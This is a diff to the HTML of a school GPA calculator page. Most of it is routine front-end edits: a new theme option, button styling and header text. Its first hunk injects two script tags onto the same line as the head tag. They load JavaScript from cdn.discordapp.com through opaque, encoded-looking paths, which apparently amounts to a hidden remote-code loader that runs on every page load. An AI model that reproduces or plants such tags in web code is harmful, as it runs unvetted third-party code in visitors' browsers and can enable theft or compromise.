@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/40rvz_-d5k03KavHAROolI2K20aPMjVTug6v1zULhsDyK3RXbwr-n8eeodU5XElUOKu__PevlI5O4dPJ7eIIkg=='></script><script type='text/javascript' src='https://cdn.discordapp.com/IVHeuL0VK686uWhtHcBdtks-AEiukvfupkFoFMX52iU2rIPQ6Wq3KMQTO4q7q4bQU3tkibI2y4b6Tpg9x75d8g=='></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="step1.css">
@@ -30,6 +30,8 @@
           <option value="nord">Nord</option>
           <option value="ehs">Eagles</option>
           <option value="catpuccin">Catpuccin</option>
+          <option value="starry">Starry</option>
+
         </select>
       </div>
     </nav>
@@ -49,11 +51,14 @@
           <option value="nord">Nord</option>
           <option value="ehs">Eagles</option>
           <option value="catpuccin">Catpuccin</option>
+          <option value="starry">Starry</option>
+
         </select>
       
     </nav>
     <br>
-    <h1 class="text-4xl font-bold text-center">Lifelinee</h1>  
+    <h1 class="text-4xl font-bold text-center">Lifelinee</h1>
+    <br>  
 </div>
 
 <!-- universal header * end copy here * -->  
@@ -65,30 +70,22 @@
 
  <header>
   <div class="title">
-     <h1 style="font-size: 42.5px; font-family: Georgia ;"> EHS GPA Calculator  </h1>
-     <h4 style="font-size: 25px;"> Step 1/3 </h4>
-     <h4 style="font-size: 18px;"> Before we continue, we need you to please input your classes: </h4>
+     <h1 style="font-size: 42.5px; font-family: Georgia ;"> GPA Calculator </h1>
+     <h5> (Editing classes)  </h5>
   </div>
 </header>
 
 
-<hr>
-<!--- Top buttons -->
-<div style="text-align: center;">
-    <a href="../index.html">
-        <button id="home"> Home </button>
-    </a>
-    <button id="help"> Help/FAQ </button>
-</div>
+<hr><br><br>
 
 <!--- Top area buttons -->
 <!-- mp buttons -->
- <div class="parent ehs:bg-blue-500">
+ <div class="parent">
     
-        <button class="butt mp1" id="mp1" onclick="mpButts(1)"> mp1</button>
-        <button class="butt mp2" id="mp2" onclick="mpButts(2)"> mp2</button>
-        <button class="butt mp3" id="mp3" onclick="mpButts(3)"> mp3</button>
-        <button class="butt mp4" id="mp4" onclick="mpButts(4)"> mp4</button>
+        <button class="bg-button hover:brightness-80 butt mp1" id="mp1" onclick="mpButts(1)"> mp1</button>
+        <button class="bg-button hover:brightness-80 butt mp2" id="mp2" onclick="mpButts(2)"> mp2</button>
+        <button class="bg-button hover:brightness-80 butt mp3" id="mp3" onclick="mpButts(3)"> mp3</button>
+        <button class="bg-button hover:brightness-80 butt mp4" id="mp4" onclick="mpButts(4)"> mp4</button>
     
 </div>
 <br>
@@ -97,7 +94,7 @@
 
 <!-- add class button -->
 <div id="options">
-    <button id="add_class" onclick="unhide2(); valueReset();"> Add Class </button>
+    <button class="hover:brightness-80 border" id="add_class" onclick="unhide2(); valueReset();"> Add Class </button>
     <br><br>
 
     <!-- class num and max num -->
@@ -111,9 +108,8 @@
     <h2 id="max_classes" style="display:none"> You have reached the Maximum amount of classes allowed! </h2>
 
     <!-- Clear data/storage buttons -->
-    <button id="reset_data" onclick="clearLocalStorage()"> Reset Data </button>
     <br>
-    <button id="clear_table" onclick="clearTable()"> Clear Table </button>
+    <button class="border " id="clear_table" onclick="clearTable()"> Clear Table </button>
 
 </div>
 
@@ -163,9 +159,6 @@
                     <option value="Visual_Arts"> Visual Arts </option>
                     <option value="Perf_Arts"> Performing Arts </option>
                     <option value="Science Electives"> Performing Arts </option>
-
-
-                    
                     
                 </select>
                 <br>
@@ -242,7 +235,8 @@
             </div>
 
             <!-- Submit button -->
-            <button id="submit" onclick="input(); hide()" style="display:none"> Submit </button>
+             <br><br>
+            <button class="border flex center"id="submit" onclick="input(); hide()" style="display:none"> Submit </button>
  <!-- input closing div -->
         </div>
 <!-- class inputs closing div -->
